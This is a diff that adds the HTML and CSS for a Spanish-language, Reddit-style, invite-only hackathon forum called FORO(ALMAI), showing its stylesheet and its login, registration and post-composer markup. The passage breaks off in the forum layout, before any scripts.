@@ -1,0 +1,1372 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FORO(ALMAI)</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:        #1a1a1b;
+  --bg2:       #161617;
+  --surface:   #ffffff10;
+  --card:      #272729;
+  --card2:     #313133;
+  --border:    #343536;
+  --orange:    #ff4500;
+  --orange2:   #ff6534;
+  --orange-bg: rgba(255,69,0,0.1);
+  --blue:      #0079d3;
+  --blue-bg:   rgba(0,121,211,0.1);
+  --green:     #46d160;
+  --red:       #ff585b;
+  --text:      #d7dadc;
+  --text-2:    #818384;
+  --text-3:    #4a4a4b;
+  --upvote:    #ff4500;
+  --downvote:  #7193ff;
+
+  /* rank colors */
+  --r-newbie:  #818384;
+  --r-member:  #4fbdff;
+  --r-veteran: #ff6534;
+  --r-mod:     #46d160;
+  --r-admin:   #ff4500;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  background: var(--bg2);
+  color: var(--text);
+  font-family: 'Inter', sans-serif;
+  min-height: 100vh;
+}
+
+/* ── TOP NAV ── */
+nav {
+  position: sticky; top: 0; z-index: 200;
+  height: 48px;
+  background: var(--card);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center;
+  padding: 0 1.25rem; gap: 1rem;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.4);
+}
+.nav-logo {
+  display: flex; align-items: center; gap: 0.5rem;
+  font-weight: 700; font-size: 1.05rem; color: var(--text);
+  text-decoration: none; flex-shrink: 0;
+}
+.nav-logo-icon {
+  width: 32px; height: 32px; border-radius: 50%;
+  background: var(--orange);
+  display: flex; align-items: center; justify-content: center;
+  font-weight: 900; font-size: 0.75rem; color: white;
+}
+.nav-pill {
+  display: flex; align-items: center; gap: 0.4rem;
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 20px; padding: 0.25rem 0.75rem;
+  font-size: 0.72rem; color: var(--text-2); cursor: pointer;
+  transition: border-color .15s;
+}
+.nav-pill:hover { border-color: var(--orange); color: var(--text); }
+.nav-search {
+  flex: 1; max-width: 400px; position: relative;
+}
+.nav-search input {
+  width: 100%; background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 20px; padding: 0.35rem 1rem 0.35rem 2rem;
+  color: var(--text); font-size: 0.8rem; outline: none;
+  transition: border-color .15s;
+}
+.nav-search input:focus { border-color: var(--orange); }
+.nav-search input::placeholder { color: var(--text-3); }
+.nav-search-icon { position: absolute; left: 0.7rem; top: 50%; transform: translateY(-50%); opacity: 0.4; font-size: 0.75rem; pointer-events: none; }
+.nav-right { margin-left: auto; display: flex; align-items: center; gap: 0.6rem; }
+.nav-user-wrap { display: flex; align-items: center; gap: 0.4rem; cursor: pointer; padding: 0.25rem 0.6rem; border-radius: 4px; transition: background .15s; }
+.nav-user-wrap:hover { background: var(--card2); }
+.nav-av {
+  width: 28px; height: 28px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.6rem; font-weight: 700; color: white; flex-shrink: 0;
+}
+.nav-username { font-size: 0.75rem; font-weight: 600; color: var(--text); }
+.nav-karma { font-size: 0.65rem; color: var(--text-2); }
+
+/* ── BUTTONS ── */
+.btn {
+  padding: 0.35rem 1rem; border-radius: 20px; border: none;
+  font-size: 0.78rem; font-weight: 700; cursor: pointer;
+  transition: all .15s; line-height: 1.5;
+}
+.btn-orange { background: var(--orange); color: white; }
+.btn-orange:hover { background: var(--orange2); }
+.btn-outline { background: transparent; color: var(--orange); border: 1px solid var(--orange); }
+.btn-outline:hover { background: var(--orange-bg); }
+.btn-gray { background: transparent; color: var(--text-2); border: 1px solid var(--border); }
+.btn-gray:hover { border-color: var(--text-2); color: var(--text); }
+.btn-sm { padding: 0.2rem 0.65rem; font-size: 0.68rem; border-radius: 4px; }
+
+/* ── LAYOUT ── */
+.layout {
+  max-width: 1100px; margin: 0 auto;
+  padding: 1.25rem 1rem;
+  display: grid; grid-template-columns: 1fr 312px;
+  gap: 1.25rem; align-items: start;
+}
+
+/* ── SUB BANNER ── */
+.sub-banner {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 6px; overflow: hidden; margin-bottom: 1rem;
+}
+.sub-cover {
+  height: 72px;
+  background: linear-gradient(135deg, #1a0500, #2d0e00, #1a0500);
+  position: relative; overflow: hidden;
+}
+.sub-cover::after {
+  content: 'r/almai';
+  position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
+  font-size: 3rem; font-weight: 900; color: rgba(255,69,0,0.08); letter-spacing: .3em;
+}
+.sub-info { padding: 0.75rem 1.25rem; display: flex; align-items: center; gap: 0.85rem; }
+.sub-icon {
+  width: 48px; height: 48px; border-radius: 50%;
+  background: var(--orange); border: 3px solid var(--card);
+  display: flex; align-items: center; justify-content: center;
+  font-weight: 900; font-size: 1rem; color: white; margin-top: -24px; flex-shrink: 0;
+}
+.sub-meta h2 { font-size: 1rem; font-weight: 700; color: var(--text); }
+.sub-meta p { font-size: 0.7rem; color: var(--text-2); margin-top: 0.1rem; }
+
+/* ── TABS ── */
+.tabs {
+  display: flex; background: var(--card); border: 1px solid var(--border);
+  border-radius: 6px; overflow: hidden; margin-bottom: 0.85rem;
+}
+.tab {
+  flex: 1; padding: 0.55rem; background: transparent; border: none;
+  border-bottom: 2px solid transparent; cursor: pointer;
+  font-size: 0.8rem; font-weight: 600; color: var(--text-2);
+  transition: all .15s;
+}
+.tab:hover { background: var(--card2); color: var(--text); }
+.tab.active { color: var(--orange); border-bottom-color: var(--orange); background: var(--card2); }
+
+/* ── SORT BAR ── */
+.sort-bar {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 6px; padding: 0.5rem 0.75rem;
+  display: flex; align-items: center; gap: 0.25rem; margin-bottom: 0.75rem;
+}
+.sort-btn {
+  padding: 0.3rem 0.75rem; border-radius: 20px; border: none;
+  background: transparent; color: var(--text-2); font-size: 0.78rem;
+  font-weight: 600; cursor: pointer; transition: all .15s;
+}
+.sort-btn:hover { background: var(--card2); color: var(--text); }
+.sort-btn.active { background: var(--orange-bg); color: var(--orange); }
+
+/* ── QUICK COMPOSE ── */
+.quick-compose {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 6px; padding: 0.6rem 0.75rem;
+  display: flex; align-items: center; gap: 0.6rem;
+  margin-bottom: 0.75rem;
+}
+.qc-av {
+  width: 38px; height: 38px; border-radius: 50%; flex-shrink: 0;
+  background: var(--card2); border: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.65rem; font-weight: 700; color: var(--text-2);
+}
+.qc-input {
+  flex: 1; background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 4px; padding: 0.45rem 0.85rem;
+  color: var(--text-3); font-size: 0.8rem; cursor: pointer;
+  transition: border-color .15s;
+}
+.qc-input:hover { border-color: var(--orange); color: var(--text-2); }
+
+/* ── POST CARD ── */
+.post-card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 6px; display: flex; overflow: hidden;
+  margin-bottom: 0.6rem; transition: border-color .15s;
+  cursor: pointer;
+}
+.post-card:hover { border-color: var(--text-3); }
+
+.vote-col {
+  width: 40px; flex-shrink: 0; background: var(--bg2);
+  display: flex; flex-direction: column; align-items: center;
+  padding: 0.6rem 0; gap: 0.1rem;
+}
+.vote-up, .vote-dn {
+  width: 24px; height: 24px; border: none; background: transparent;
+  border-radius: 3px; display: flex; align-items: center; justify-content: center;
+  font-size: 1.1rem; color: var(--text-3); cursor: pointer; transition: all .1s;
+}
+.vote-up:hover { color: var(--upvote); background: var(--orange-bg); }
+.vote-dn:hover { color: var(--downvote); background: rgba(113,147,255,.1); }
+.vote-up.on  { color: var(--upvote); }
+.vote-dn.on  { color: var(--downvote); }
+.vote-num {
+  font-size: 0.65rem; font-weight: 700; color: var(--text-2);
+  font-family: 'IBM Plex Mono', monospace;
+}
+.vote-num.up { color: var(--upvote); }
+.vote-num.dn { color: var(--downvote); }
+
+.post-main { flex: 1; padding: 0.6rem 0.75rem 0.5rem; min-width: 0; }
+.post-meta {
+  font-size: 0.7rem; color: var(--text-2);
+  display: flex; flex-wrap: wrap; align-items: center; gap: 0.3rem;
+  margin-bottom: 0.35rem;
+}
+.post-sub { color: var(--text); font-weight: 700; }
+.post-sub:hover { text-decoration: underline; cursor: pointer; }
+.post-by { cursor: pointer; }
+.post-by:hover { text-decoration: underline; }
+
+/* ── RANK BADGE ── */
+.rank-badge {
+  display: inline-flex; align-items: center; gap: 0.25rem;
+  font-size: 0.62rem; font-weight: 700; padding: 0.05rem 0.45rem;
+  border-radius: 3px; font-family: 'IBM Plex Mono', monospace;
+  letter-spacing: 0.03em; flex-shrink: 0;
+}
+.rank-newbie  { background: rgba(129,131,132,.15); color: var(--r-newbie); }
+.rank-member  { background: rgba(79,189,255,.1);  color: var(--r-member); }
+.rank-veteran { background: rgba(255,101,52,.1);  color: var(--r-veteran); }
+.rank-mod     { background: rgba(70,209,96,.1);   color: var(--r-mod); }
+.rank-admin   { background: rgba(255,69,0,.15);   color: var(--r-admin); }
+
+.flair {
+  font-size: 0.63rem; font-weight: 600; padding: 0.05rem 0.45rem;
+  border-radius: 20px; cursor: pointer;
+}
+.flair-tech   { background: rgba(0,121,211,.15); color: #4fbdff; }
+.flair-sec    { background: rgba(255,69,0,.15);  color: #ff8566; }
+.flair-tip    { background: rgba(70,209,96,.1);  color: var(--green); }
+.flair-debate { background: rgba(255,180,0,.1);  color: #ffd166; }
+
+.post-title {
+  font-size: 1rem; font-weight: 600; color: var(--text);
+  line-height: 1.35; margin-bottom: 0.35rem;
+}
+.post-preview {
+  font-size: 0.82rem; color: var(--text-2); line-height: 1.55;
+  display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+  margin-bottom: 0.45rem;
+}
+.post-actions {
+  display: flex; flex-wrap: wrap; gap: 0.15rem;
+}
+.act-btn {
+  display: flex; align-items: center; gap: 0.3rem;
+  font-size: 0.72rem; font-weight: 700; color: var(--text-2);
+  padding: 0.25rem 0.5rem; border-radius: 3px; border: none;
+  background: transparent; cursor: pointer; transition: all .12s;
+}
+.act-btn:hover { background: var(--card2); color: var(--text); }
+.act-btn.on { color: var(--orange); }
+
+/* ── EXPANDED POST ── */
+.post-expanded { display: none; border-top: 1px solid var(--border); padding: 0.85rem 0.75rem; }
+.post-expanded.open { display: block; }
+.post-full { font-size: 0.88rem; line-height: 1.7; color: var(--text-2); white-space: pre-wrap; margin-bottom: 1rem; }
+.post-full code { background: var(--bg2); border: 1px solid var(--border); padding: 0.1rem 0.35rem; border-radius: 3px; font-family: 'IBM Plex Mono', monospace; font-size: 0.78rem; color: var(--green); }
+
+.reply-box { background: var(--bg2); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; margin-bottom: 0.85rem; }
+.reply-box textarea { width: 100%; background: transparent; border: none; outline: none; color: var(--text); font-family: 'Inter', sans-serif; font-size: 0.85rem; padding: 0.6rem 0.75rem; resize: none; min-height: 72px; }
+.reply-box textarea::placeholder { color: var(--text-3); }
+.reply-box-footer { display: flex; align-items: center; justify-content: flex-end; gap: 0.4rem; padding: 0.35rem 0.5rem; border-top: 1px solid var(--border); }
+.reply-char { font-size: 0.62rem; color: var(--text-3); margin-right: auto; font-family: 'IBM Plex Mono', monospace; }
+
+/* ── COMMENTS ── */
+.comment { display: flex; gap: 0.5rem; padding: 0.5rem 0; border-top: 1px solid var(--border); }
+.c-line { flex-shrink: 0; width: 2px; background: var(--border); border-radius: 1px; cursor: pointer; transition: background .12s; margin-top: 2px; }
+.c-line:hover { background: var(--orange); }
+.c-body { flex: 1; min-width: 0; }
+.c-meta { font-size: 0.7rem; color: var(--text-2); display: flex; flex-wrap: wrap; align-items: center; gap: 0.3rem; margin-bottom: 0.3rem; }
+.c-author { font-weight: 700; color: var(--text); cursor: pointer; }
+.c-author:hover { text-decoration: underline; color: var(--orange); }
+.c-text { font-size: 0.85rem; line-height: 1.6; color: var(--text-2); margin-bottom: 0.3rem; }
+.c-text code { background: var(--bg2); border: 1px solid var(--border); padding: 0.1rem 0.3rem; border-radius: 3px; font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; color: var(--green); }
+.c-actions { display: flex; gap: 0.1rem; align-items: center; }
+.c-vote-up, .c-vote-dn { font-size: 0.9rem; background: transparent; border: none; cursor: pointer; color: var(--text-3); padding: 0.1rem 0.25rem; border-radius: 3px; transition: all .1s; }
+.c-vote-up:hover { color: var(--upvote); background: var(--orange-bg); }
+.c-vote-dn:hover { color: var(--downvote); background: rgba(113,147,255,.1); }
+.c-vote-up.on { color: var(--upvote); }
+.c-vote-dn.on { color: var(--downvote); }
+.c-score { font-size: 0.65rem; color: var(--text-2); font-family: 'IBM Plex Mono', monospace; padding: 0 0.1rem; }
+.c-act { font-size: 0.7rem; font-weight: 700; color: var(--text-2); background: transparent; border: none; cursor: pointer; padding: 0.1rem 0.35rem; border-radius: 3px; transition: all .1s; }
+.c-act:hover { background: var(--card2); color: var(--text); }
+
+/* ── FEEDBACK TAB ── */
+.fb-composer {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 6px; overflow: hidden; margin-bottom: 0.85rem;
+}
+.fb-type-tabs { display: flex; border-bottom: 1px solid var(--border); }
+.fb-type-tab {
+  flex: 1; padding: 0.5rem; background: transparent; border: none;
+  border-bottom: 2px solid transparent; cursor: pointer;
+  font-size: 0.75rem; font-weight: 600; color: var(--text-2); transition: all .15s;
+}
+.fb-type-tab.active { color: var(--orange); border-bottom-color: var(--orange); background: var(--card2); }
+.fb-body { padding: 0.85rem; }
+.fb-field { margin-bottom: 0.7rem; }
+.fb-field label { display: block; font-size: 0.68rem; font-weight: 600; color: var(--text-2); margin-bottom: 0.3rem; text-transform: uppercase; letter-spacing: .05em; }
+.fb-field input, .fb-field textarea {
+  width: 100%; background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 4px; color: var(--text); font-family: 'Inter', sans-serif;
+  font-size: 0.83rem; padding: 0.45rem 0.7rem; outline: none; transition: border-color .15s;
+}
+.fb-field input:focus, .fb-field textarea:focus { border-color: var(--orange); }
+.fb-field input::placeholder, .fb-field textarea::placeholder { color: var(--text-3); }
+.fb-field textarea { resize: none; min-height: 80px; }
+.chips { display: flex; flex-wrap: wrap; gap: 0.35rem; margin-top: 0.25rem; }
+.chip { font-size: 0.72rem; font-weight: 600; padding: 0.2rem 0.6rem; border-radius: 20px; border: 1px solid var(--border); background: transparent; color: var(--text-2); cursor: pointer; transition: all .12s; }
+.chip:hover { border-color: var(--orange); color: var(--orange); }
+.chip.on { border-color: var(--orange); color: var(--orange); background: var(--orange-bg); }
+.stars { display: flex; gap: 0.2rem; margin-top: 0.25rem; }
+.star { font-size: 1.3rem; background: none; border: none; cursor: pointer; opacity: 0.25; transition: all .12s; }
+.star.on, .star:hover { opacity: 1; filter: drop-shadow(0 0 4px #fbbf24); }
+
+.fb-card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 6px; display: flex; overflow: hidden; margin-bottom: 0.6rem;
+}
+.fb-bar { width: 4px; flex-shrink: 0; }
+.fb-bar.bug  { background: var(--red); }
+.fb-bar.ux   { background: var(--blue); }
+.fb-bar.feat { background: var(--green); }
+.fb-bar.sec  { background: var(--orange); }
+
+/* ── SIDEBAR ── */
+.sidebar { display: flex; flex-direction: column; gap: 0.85rem; }
+.s-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+.s-head { padding: 0.65rem 0.85rem; border-bottom: 1px solid var(--border); font-size: 0.72rem; font-weight: 700; color: var(--text); text-transform: uppercase; letter-spacing: .06em; }
+.s-body { padding: 0.75rem 0.85rem; }
+.s-stat-row { display: flex; justify-content: space-between; align-items: center; padding: 0.3rem 0; border-bottom: 1px solid var(--border); font-size: 0.8rem; }
+.s-stat-row:last-child { border-bottom: none; }
+.s-stat-key { color: var(--text-2); }
+.s-stat-val { font-weight: 700; font-family: 'IBM Plex Mono', monospace; color: var(--text); font-size: 0.78rem; }
+.s-stat-val.orange { color: var(--orange); }
+.s-stat-val.green  { color: var(--green); }
+.s-stat-val.red    { color: var(--red); }
+.online-item { display: flex; align-items: center; gap: 0.5rem; padding: 0.35rem 0; border-bottom: 1px solid var(--border); font-size: 0.8rem; }
+.online-item:last-child { border-bottom: none; }
+.pip { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+.pip.on   { background: var(--green); box-shadow: 0 0 4px var(--green); }
+.pip.idle { background: #fbbf24; box-shadow: 0 0 4px #fbbf24; }
+.pip.off  { background: var(--text-3); }
+.rule-row { display: flex; gap: 0.5rem; padding: 0.35rem 0; border-bottom: 1px solid var(--border); font-size: 0.78rem; }
+.rule-row:last-child { border-bottom: none; }
+.rule-n { font-weight: 700; color: var(--orange); font-family: 'IBM Plex Mono', monospace; flex-shrink: 0; }
+.rule-t { color: var(--text-2); }
+
+/* ── RANK PANEL ── */
+.rank-row {
+  display: flex; align-items: center; gap: 0.5rem;
+  padding: 0.4rem 0; border-bottom: 1px solid var(--border); font-size: 0.8rem;
+}
+.rank-row:last-child { border-bottom: none; }
+.rank-row-name { font-weight: 600; color: var(--text); flex: 1; }
+.rank-row-pts { font-family: 'IBM Plex Mono', monospace; font-size: 0.68rem; color: var(--text-2); }
+
+/* ── MARISCOS RECIO AD ── */
+.recio-wrap {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 6px; overflow: hidden; cursor: pointer;
+  transition: border-color .15s;
+}
+.recio-wrap:hover { border-color: #0066aa; }
+.recio-cover {
+  height: 44px; background: linear-gradient(135deg, #000d1a, #001530);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.55rem; font-weight: 700; letter-spacing: .15em;
+  color: rgba(0,170,255,.25); font-family: 'IBM Plex Mono', monospace;
+}
+.recio-body { padding: 0.6rem 0.75rem; display: flex; gap: 0.6rem; align-items: center; }
+.recio-logo { width: 52px; height: 52px; border-radius: 4px; overflow: hidden; flex-shrink: 0; border: 1px solid #0044aa; }
+.recio-info { flex: 1; }
+.recio-brand { font-weight: 700; font-size: 0.82rem; color: #00aaff; }
+.recio-brand em { font-style: normal; color: #00ddff; }
+.recio-tagline { font-size: 0.7rem; color: #336688; margin-top: 0.15rem; }
+.recio-cta { display: inline-block; margin-top: 0.35rem; font-size: 0.65rem; font-weight: 700; background: var(--blue); color: white; padding: 0.2rem 0.6rem; border-radius: 20px; }
+.recio-foot { padding: 0.3rem 0.75rem; background: rgba(0,10,20,.4); border-top: 1px solid var(--border); font-size: 0.6rem; color: var(--text-3); font-family: 'IBM Plex Mono', monospace; display: flex; justify-content: space-between; }
+
+/* ── AUTH GATE ── */
+#authGate {
+  position: fixed; inset: 0; z-index: 500;
+  display: flex; align-items: center; justify-content: center;
+  background: rgba(0,0,0,.7); backdrop-filter: blur(6px);
+  animation: fadeIn .25s ease;
+}
+@keyframes fadeIn  { from{opacity:0} to{opacity:1} }
+@keyframes fadeOut { from{opacity:1} to{opacity:0} }
+@keyframes slideUp { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
+
+.gate-card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 8px; width: 100%; max-width: 400px;
+  overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,.6);
+  animation: slideUp .3s cubic-bezier(.16,1,.3,1) both;
+}
+.gate-head {
+  padding: 1.25rem 1.5rem 0;
+  display: flex; align-items: center; gap: 0.6rem;
+}
+.gate-head-icon { width: 36px; height: 36px; border-radius: 50%; background: var(--orange); display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 0.75rem; color: white; }
+.gate-head-title { font-size: 1.05rem; font-weight: 700; color: var(--text); }
+.gate-head-sub { font-size: 0.7rem; color: var(--text-2); margin-top: 0.1rem; }
+.gate-tabs { display: flex; margin: 1rem 1.5rem 0; gap: 0; border-bottom: 1px solid var(--border); }
+.gate-tab { flex: 1; padding: 0.5rem; background: transparent; border: none; border-bottom: 2px solid transparent; cursor: pointer; font-size: 0.78rem; font-weight: 600; color: var(--text-2); transition: all .15s; }
+.gate-tab.active { color: var(--orange); border-bottom-color: var(--orange); }
+.gate-body { padding: 1.1rem 1.5rem 1.5rem; }
+.gate-error {
+  background: rgba(255,88,91,.08); border: 1px solid rgba(255,88,91,.25); border-radius: 4px;
+  padding: 0.5rem 0.7rem; font-size: 0.75rem; color: var(--red); margin-bottom: 0.75rem; display: none;
+}
+.gate-error.show { display: block; animation: shake .3s ease; }
+@keyframes shake { 0%,100%{transform:translateX(0)} 30%{transform:translateX(-4px)} 70%{transform:translateX(4px)} }
+.g-field { margin-bottom: 0.8rem; }
+.g-field label { display: block; font-size: 0.68rem; font-weight: 600; color: var(--text-2); margin-bottom: 0.3rem; }
+.g-field input {
+  width: 100%; background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 4px; color: var(--text); font-size: 0.82rem;
+  padding: 0.5rem 0.75rem; outline: none; transition: border-color .15s;
+}
+.g-field input:focus { border-color: var(--orange); }
+.g-field input::placeholder { color: var(--text-3); }
+.g-field input.err { border-color: var(--red); }
+.g-err { font-size: 0.68rem; color: var(--red); margin-top: 0.2rem; display: none; }
+.g-hint { font-size: 0.68rem; color: var(--text-2); margin-top: 0.3rem; }
+.g-hint span { color: var(--orange); font-weight: 600; font-family: 'IBM Plex Mono', monospace; }
+.gate-submit { width: 100%; padding: 0.6rem; background: var(--orange); color: white; border: none; border-radius: 20px; font-size: 0.82rem; font-weight: 700; cursor: pointer; transition: background .15s; margin-top: 0.25rem; }
+.gate-submit:hover { background: var(--orange2); }
+
+/* ── MODAL ── */
+.modal-bg { position: fixed; inset: 0; z-index: 400; background: rgba(0,0,0,.6); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; }
+.modal-bg.open { display: flex; }
+.modal { background: var(--card); border: 1px solid var(--border); border-radius: 8px; width: 100%; max-width: 560px; overflow: hidden; animation: slideUp .25s ease both; }
+.modal-head { display: flex; align-items: center; justify-content: space-between; padding: 0.85rem 1rem; border-bottom: 1px solid var(--border); }
+.modal-title { font-size: 0.9rem; font-weight: 700; color: var(--text); }
+.modal-x { background: transparent; border: none; color: var(--text-2); cursor: pointer; font-size: 1.1rem; transition: color .12s; }
+.modal-x:hover { color: var(--red); }
+.modal-body { padding: 1rem; }
+.modal-body input, .modal-body textarea { width: 100%; background: var(--bg2); border: 1px solid var(--border); border-radius: 4px; color: var(--text); font-family: 'Inter', sans-serif; font-size: 0.85rem; padding: 0.5rem 0.75rem; outline: none; margin-bottom: 0.65rem; transition: border-color .15s; }
+.modal-body input:focus, .modal-body textarea:focus { border-color: var(--orange); }
+.modal-body input::placeholder, .modal-body textarea::placeholder { color: var(--text-3); }
+.modal-body textarea { resize: none; min-height: 110px; }
+.modal-foot { padding: 0.65rem 1rem; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 0.5rem; }
+
+/* ── ADMIN PANEL (code manager) ── */
+.code-table { width: 100%; border-collapse: collapse; font-size: 0.78rem; }
+.code-table th { text-align: left; padding: 0.4rem 0.5rem; color: var(--text-2); font-weight: 600; border-bottom: 1px solid var(--border); font-size: 0.68rem; text-transform: uppercase; letter-spacing: .05em; }
+.code-table td { padding: 0.4rem 0.5rem; border-bottom: 1px solid var(--border); color: var(--text-2); }
+.code-table tr:last-child td { border-bottom: none; }
+.code-val { font-family: 'IBM Plex Mono', monospace; color: var(--text); font-size: 0.75rem; letter-spacing: .05em; }
+.code-used { color: var(--text-3); text-decoration: line-through; }
+.badge-used { font-size: 0.6rem; background: rgba(255,88,91,.1); color: var(--red); padding: 0.1rem 0.4rem; border-radius: 3px; }
+.badge-free { font-size: 0.6rem; background: rgba(70,209,96,.1); color: var(--green); padding: 0.1rem 0.4rem; border-radius: 3px; }
+
+/* ── TOAST ── */
+.toast {
+  position: fixed; bottom: 1.25rem; right: 1.25rem; z-index: 9999;
+  background: var(--card); border: 1px solid var(--border);
+  border-left: 3px solid var(--orange); border-radius: 6px;
+  padding: 0.6rem 1rem; font-size: 0.78rem; color: var(--text);
+  box-shadow: 0 4px 16px rgba(0,0,0,.4); display: none;
+  animation: toastIn .2s ease;
+}
+@keyframes toastIn { from{opacity:0;transform:translateX(10px)} to{opacity:1;transform:translateX(0)} }
+
+@media (max-width: 740px) { .layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
+</style>
+</head>
+<body>
+
+<!-- ═══ AUTH GATE ═══ -->
+<div id="authGate">
+  <div class="gate-card">
+    <div class="gate-head">
+      <div class="gate-head-icon">F</div>
+      <div>
+        <div class="gate-head-title">FORO(ALMAI)</div>
+        <div class="gate-head-sub">r/almai · acceso por invitación</div>
+      </div>
+    </div>
+    <div class="gate-tabs">
+      <button class="gate-tab active" id="gTabIn" onclick="gTab('in')">Iniciar sesión</button>
+      <button class="gate-tab" id="gTabUp" onclick="gTab('up')">Registrarse</button>
+    </div>
+    <div class="gate-body">
+      <div class="gate-error" id="gErr"></div>
+
+      <!-- LOGIN -->
+      <div id="gFormIn">
+        <div class="g-field">
+          <label>Usuario</label>
+          <input id="lUser" type="text" placeholder="tu_usuario" autocomplete="username">
+          <div class="g-err" id="lUserE"></div>
+        </div>
+        <div class="g-field">
+          <label>Contraseña</label>
+          <input id="lPass" type="password" placeholder="contraseña" autocomplete="current-password">
+          <div class="g-err" id="lPassE"></div>
+        </div>
+        <button class="gate-submit" onclick="doLogin()">Iniciar sesión</button>
+      </div>
+
+      <!-- REGISTER -->
+      <div id="gFormUp" style="display:none">
+        <div class="g-field">
+          <label>Código de invitación</label>
+          <input id="rCode" type="text" placeholder="XXXX-XXXX" autocomplete="off" style="font-family:'IBM Plex Mono',monospace;letter-spacing:.08em;text-transform:uppercase">
+          <div class="g-err" id="rCodeE"></div>
+          <div class="g-hint">Necesitas un código válido generado por un <span>ADMIN</span> o <span>MOD</span>.</div>
+        </div>
+        <div class="g-field">
+          <label>Usuario (mín. 3 caracteres)</label>
+          <input id="rUser" type="text" placeholder="nuevo_usuario" autocomplete="username">
+          <div class="g-err" id="rUserE"></div>
+        </div>
+        <div class="g-field">
+          <label>Contraseña (mín. 6 caracteres)</label>
+          <input id="rPass" type="password" placeholder="contraseña" autocomplete="new-password">
+          <div class="g-err" id="rPassE"></div>
+        </div>
+        <div class="g-field">
+          <label>Confirmar contraseña</label>
+          <input id="rPass2" type="password" placeholder="repetir contraseña" autocomplete="new-password">
+          <div class="g-err" id="rPass2E"></div>
+        </div>
+        <button class="gate-submit" onclick="doRegister()">Crear cuenta</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ NEW POST MODAL ═══ -->
+<div class="modal-bg" id="postModal">
+  <div class="modal">
+    <div class="modal-head">
+      <span class="modal-title">Crear post en r/almai</span>
+      <button class="modal-x" onclick="closePostModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <input id="pTitle" type="text" placeholder="Título..." maxlength="200">
+      <div style="display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:.65rem">
+        <button class="chip" onclick="toggleChip(this)" data-flair="TECH">💻 Tech</button>
+        <button class="chip" onclick="toggleChip(this)" data-flair="SEC">🔒 Seguridad</button>
+        <button class="chip" onclick="toggleChip(this)" data-flair="TIP">💡 Tip</button>
+        <button class="chip" onclick="toggleChip(this)" data-flair="DEBATE">🗣 Debate</button>
+      </div>
+      <textarea id="pBody" placeholder="Texto (opcional)..." maxlength="2000"></textarea>
+    </div>
+    <div class="modal-foot">
+      <button class="btn btn-gray btn-sm" onclick="closePostModal()">Cancelar</button>
+      <button class="btn btn-orange btn-sm" onclick="submitPost()">Publicar</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ FORUM ═══ -->
+<div id="forumApp" style="display:none">
+  <nav>
+    <div class="nav-logo">
+      <div class="nav-logo-icon">F</div>
+      FORO(ALMAI)
+    </div>
+    <div class="nav-pill">r/almai ▾</div>
+    <div class="nav-search">
+      <span class="nav-search-icon">🔍</span>
+      <input type="text" placeholder="Buscar en r/almai...">
+    </div>
+    <div class="nav-right">
+      <div class="nav-user-wrap" id="navUserWrap">
+        <div class="nav-av" id="navAv">U</div>
+        <div>
+          <div class="nav-username" id="navUsername">—</div>
+          <div class="nav-karma" id="navKarma">0 karma</div>
+        </div>
+      </div>
+      <button class="btn btn-orange btn-sm" onclick="openPostModal()">+ Crear post</button>
+      <button class="btn btn-gray btn-sm" onclick="doLogout()">Salir</button>
+    </div>
+  </nav>
+
+  <div class="layout">
+    <main>
+      <!-- sub banner -->
+      <div class="sub-banner">
+        <div class="sub-cover"></div>
+        <div class="sub-info">
+          <div class="sub-icon">FA</div>
+          <div class="sub-meta">
+            <h2>r/almai</h2>
+            <p>Foro oficial · Hackathon DAM/DAW 2025 · Acceso por invitación</p>
+          </div>
+          <button class="btn btn-outline btn-sm" style="margin-left:auto">+ Unirse</button>
+        </div>
+      </div>
+
+      <!-- main tabs -->
+      <div class="tabs">
+        <button class="tab active" id="tFeed" onclick="mainTab('feed')">📡 Posts</button>
+        <button class="tab" id="tFb" onclick="mainTab('fb')">💬 Feedback</button>
+        <button class="tab" id="tAdmin" onclick="mainTab('admin')" style="display:none">🔑 Panel Admin</button>
+      </div>
+
+      <!-- POSTS -->
+      <div id="pFeed">
+        <div class="sort-bar">
+          <button class="sort-btn active" onclick="setSort(this)">🔥 Hot</button>
+          <button class="sort-btn" onclick="setSort(this)">✨ Nuevo</button>
